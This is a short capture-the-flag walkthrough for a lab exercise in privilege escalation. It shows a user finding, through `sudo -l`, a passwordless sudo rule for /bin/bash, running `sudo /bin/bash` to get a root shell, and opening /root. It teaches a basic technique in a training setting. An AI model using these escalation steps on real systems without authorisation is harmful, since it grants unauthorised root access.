# Solution of ctf_2
## Goal
Learning a privilege escalation technique.

## Step by step
While arriving in the machine, we find the file user.txt with the following tip :
`Hey user 2 ! I gave you access to a sudo command to make your life creating a bash shell ! But I don't remember the command. 
Maybe you could find it using sudo -h.`

We can try to do the same thing as precedent ctf by running `cd /root`.
`-bash: cd: /root: Permission denied`

Ok, seems like we can't do that anymore. Let's try that new command. `sudo -h`

You will see a lot of possible parameters to use with sudo. You have to find one that is related somehow to a bash shell.

After some search, we find something interesting doing `sudo -l`.

>
    Matching Defaults entries for user2 on ce8044a38138:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty
    
    User user2 may run the following commands on ce8044a38138:
    (ALL) NOPASSWD: /bin/bash`

It seems like user2 can run the command `/bin/bash` without any password as anyone. Let's try to launch it as root : `sudo /bin/bash`.

> 
    root@ce8044a38138:~# whoami
    root


It seems that we are now connected as root. We should be able to go to the root folder now.

> 
    root@ce8044a38138:~# cd /root
    root@ce8044a38138:~# ls
    root.txt

Yes ! You can now open the file and see what is inside.